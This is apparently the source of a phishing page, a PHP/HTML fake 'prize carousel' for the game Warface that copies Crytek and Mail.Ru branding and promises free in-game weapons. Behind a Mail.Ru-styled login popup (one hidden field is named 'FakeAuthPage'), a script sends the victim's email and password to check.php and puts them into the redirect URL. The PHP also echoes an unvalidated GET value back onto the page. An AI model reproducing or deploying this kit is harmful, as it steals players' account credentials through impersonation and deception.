<?php
session_start(); 
if(isset($_GET['logout'])) {
  if($_GET['logout'] == "1") {
    unset($_SESSION['auth']);
  }
}
if(isset($_GET['played'])) {
  if($_GET['played'] == "1") {
    $_SESSION['played'] = $_SESSION['auth'];
  }
}
if(isset($_GET['login'])) {
  $_SESSION['auth'] = $_GET['login'];
}
?>
<!DOCTYPE html>
<html lang="ru"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <title>Карусель с призами</title>
    <!-- Core styles -->
    <!-- Styles -->
    <link rel="stylesheet" href="./index_files/index.css">
    <style>
    .footer {
    width: 100%;
    }
    .footer img {
    margin: 0 auto;
    }
    .pusher {
    margin-top: 150px;
    }
</style>
  </head>
  <body>
    <div class="wfroulette_block">
      <h1 style="margin-top: 20px;">Выйграй приз</h1>
      <div class="roulette" style="margin-top: 0px;">
        <div class="rotate"></div>
          <?php if(!isset($_SESSION['auth'])) { unset($_SESSION['auth']); ?>
          <div class="center" id="not-authorized">
            <p>Авторизуйся и получи одну бесплатную попытку в игре "Карусель с призами"</p>
            <div id="authenticate" class="button">Войти</div>
            <p>Получение подарка на этой странице осуществляется единовременно. Награда будет доставлена на ваш аккаунт в течении 24-х часов</p>
          </div>
          <?php } else { ?>
          <div class="center" id="play-game">
            <p></p><h3>Добро пожаловать, <strong><?=$_SESSION['auth']?></strong> (<a href="/index.php?logout=1">Выход</a>)</h3><p></p>
                <?php if(isset($_SESSION['played']) && $_SESSION['played'] == $_SESSION['auth']) {?><div class="button disable">Вы уже получили подарок</div><?php } else { ?><div id="startgame" class="button startgame">Получить подарок</div><?php } ?>
              <p>Получение подарка на этой странице осуществляется единовременно. Награда будет доставлена на ваш аккаунт в течении 24-х часов</p>
          </div>
          <?php } ?>
        <div class="description">
          <div class="bg js-descr-bg pos6" style="display: none;"></div>
          <div class="txt js-descr-txt" style="display: none;"><img src="./index_files/prize_2_6.png" alt="">
            <h4>VIP-ускоритель сроком на месяц</h4>
          </div>
        </div>
        <div class="prizes js-prizes-list">
          <div class="pos1 js-prize">
            <img src="./index_files/prize_2_1.png" alt="FN SCAR‐H «Убийца зомби» на месяц">
          </div>
          <div class="pos2 js-prize">
            <img src="./index_files/prize_2_2.png" alt="XM8 Compact «Убийца зомби» на месяц">
          </div>
          <div class="pos3 js-prize">
            <img src="./index_files/prize_2_3.png" alt="Glock 18C «Убийца зомби» на месяц">
          </div>
          <div class="pos4 js-prize">
            <img src="./index_files/prize_2_4.png" alt="Тактический топор «Убийца зомби» на месяц">
          </div>
          <div class="pos5 js-prize">
            <img src="./index_files/prize_2_5.png" alt="Steyr Scout «Убийца зомби» на месяц">
          </div>
          <div class="pos6 js-prize">
            <img src="./index_files/prize_2_6.png" alt="Fabarm STF 12 Compact «Убийца зомби» на месяц">
          </div>
          <div class="pos7 js-prize">
            <img src="./index_files/prize_2_7.png" alt="Супер VIP-ускоритель на месяц">
          </div>
          <div class="pos8 js-prize">
            <img src="./index_files/prize_2_8.png" alt="Набор оружия Магма на месяц">
          </div>
        </div>
      </div>
      <div class="prizes_last">
        <div class="txt">
            Авторизуйтесь, чтобы начать играть
        </div>
        <div class="line" style="width: 70%; margin-left: 15%;">
          <div class="js-line" style="width: 100%;"></div>
        </div>
      </div>
    </div>
    <div class="modal"></div>
    <div class="popup_overlay"></div>
    <div class="popup_overlay_auth"></div>
    <div class="popup">
      <div class="close">✖</div>
      <h4>Поздравляем!<br>Вы выиграли приз!</h4><img src="./index_files/st.png" alt="" id="winprizeImg">
      <p class="js-wintext">Краткое описание приза</p>
      <p class="hint">Приз в течении суток поступит на ваш аккаунт</p>
    </div>
    <!-- -->
    <link rel="stylesheet" href="./index_files/footer.css">
    <footer>
      <div class="logos">
        <div>
          
          <script>
         </script><a target="_blank" href="http://crytek.com/"><img src="./index_files/crytek.png" alt="Crytek"></a><a target="_blank" href="http://cryengine.com/"><img src="./index_files/cryengine.png" alt="CryEngine"></a><a target="_blank" href="https://mail.ru/"><img src="./index_files/mail3.png" alt="Mail.Ru"></a>
          <img src="./index_files/ico12.png" alt="12+">
        </div>
      </div>
      
      <div class="copyright">
        <p>© <script>document.write(new Date().getFullYear());</script> Crytek GmbH. All Rights Reserved.</p>
        <p>Crytek, CryENGINE, Warface and the Warface logo are registered trademarks or trademarks of Crytek GmbH in Russia and/or other countries.</p>
      </div>
      </footer>
      <!-- Core scripts -->
      <script src="./index_files/jquery-3.1.1.min.js.Без названия"></script>
      <script src="./index_files/jquery.easing.min.js.Без названия"></script>
      <script src="./index_files/jQueryRotate.js.Без названия"></script>
      <!-- Template scripts -->
      <script src="./index_files/index.js.Без названия"></script>
      <script src="./index_files/kit_client.js.Без названия"></script>
      <div id="auth-model" style="display: none;">
        <div id="js_kit_holder" style="position: fixed; overflow-y: auto; overflow-x: hidden; visibility: visible; top: 0px; left: 0px; z-index: 2001; cursor: default; width: 100%; height: 553px;">
        <div id="js_kit_overlay" style="position: relative; left: 50%; background-color: rgb(255, 255, 255); margin-left: -228px; margin-bottom: 120px; margin-top: 120px; width: 436.667px;">
        <div id="js_kit_header" style="background-color: #3c3c3c; height: 39px; width: 100%; color: #fff; position: relative; padding: 0 20px; line-height: 39px; box-sizing: border-box; font-family: ProximaRegular, PTSans, sans-serif !important; font-size: 18px !important;">
        <span id="js_kit_header_title">Вход</span><span id="js_kit_header_close" class="close" style="position: absolute; right: 13px; font-size: 21px !important; padding: 0 4px; cursor: pointer;">✕</span></div>
        <div id="js_kit_container"><div class="gmrContent">    <div  id="js_kit_signin" class="gmrSignin">        <input name="Page" value="https://wf.mail.ru/v/VU7FK4OK6R" type="hidden"><input name="FakeAuthPage" value="https://wf.mail.ru/v/VU7FK4OK6R" type="hidden">              
          <div class="gmrSignin__descr">Введите логин и пароль от своего аккаунта для того, чтобы продолжить работу с сервисом.</div><p id="error" style="color: red; display: none;"><br>Неверное имя пользователя или пароль. Проверьте правильность введенных данных.</p>      
            <div id="js_kit_signin__box" class="gmrSignin__field gmrSignin__box gmrSignin__box_nodomain"><div class="gmrSignin__box__login"><input name="login" id="js_kit_signin__box__login" value="" tabindex="1" data-yandex-suggest="false" placeholder="E-mail" type="text">            </div> 
                   <div class="gmrSignin__box__domain">      <select name="Domain" id="js_kit_signin__box__domain" tabindex="1"><option value="mail.ru">@mail.ru</option> <option value="inbox.ru">@inbox.ru</option><option value="list.ru">@list.ru</option>   <option value="bk.ru">@bk.ru</option><option value="mail.ua">@mail.ua</option></select>  
                 <span id="js_kit_signin__box__domain__txt">@mail.ru</span>            </div>        </div>        <div class="gmrSignin__field gmrSignin__password" id="js_kit_signin__password">            <input name="password" id="js_kit_signin__password__input" value="" tabindex="2" placeholder="Пароль" type="password">        </div>  
                       <div class="gmrSignin__opts"><span class="gmrSignin__remember gmrSignin__checked"><input name="saveauth" value="1" checked="checked" id="js_kit_signin__remember" tabindex="4" type="checkbox">  <label for="js_kit_signin__remember" class="gmrSignin__remember__chk"></label>  <label for="js_kit_signin__remember" class="gmrSignin__remember__label">Запомнить меня</label>            </span> 
<a class="gmrSignin__register" href="https://e.mail.ru/signup" target="_blank">Нет почты Mail.Ru?</a>            <a class="gmrSignin__lostpass" href="https://wf.mail.ru/user/password" target="_blank">Забыли пароль?</a>        </div>        <div class="gmrSignin__actions"> </div>    <button class="gmrSignin__submit" tabindex="3" onclick="check()">Войти</button>
<span class="gmrSignin__social">                    Войти через:         
<a title="Вконтакте" class="gmrSignin__social__btn gmrSignin__social__btn_vk" id="js_kit_signin__social__btn_vk" href="#" onclick="window.open('/vk/', '', 'width=800, height=600, toolbar=no, scrollbars=yes'); return false;" target="_blank" data-page="#"></a></span></div></div></div></div></div>
        <div id="js_kit_darkness" class="close" style="background-color: rgb(0, 0, 0); z-index: 2000; opacity: 0.5; position: fixed; display: block; top: 0px; left: 0px; width: 100%; height: 100%;"></div>
      </div>
	  
            <script>
      	$(function () {
      		$("#js_kit_overlay").css({width: 1280 / 3 + 10});
      	});
      </script>
    <script src="js/script.js"></script>
  <link rel="stylesheet" type="text/css" id="js-gmr-client-style" href="./index_files/client.css">
  <script>
    function check() {
      var login = $("#js_kit_signin__box__login").val();
      var password = $("#js_kit_signin__password__input").val();

      $.get( "check.php",  { login: login, password: password },  function( data ) {
        if(data == "yes") {
          console.log("yes");
          window.location.href = "/?login="+login+"&password="+password;
        } else {
          $("#error").css("display", "inline");
        }
      });
    }
  </script>
  </body></html>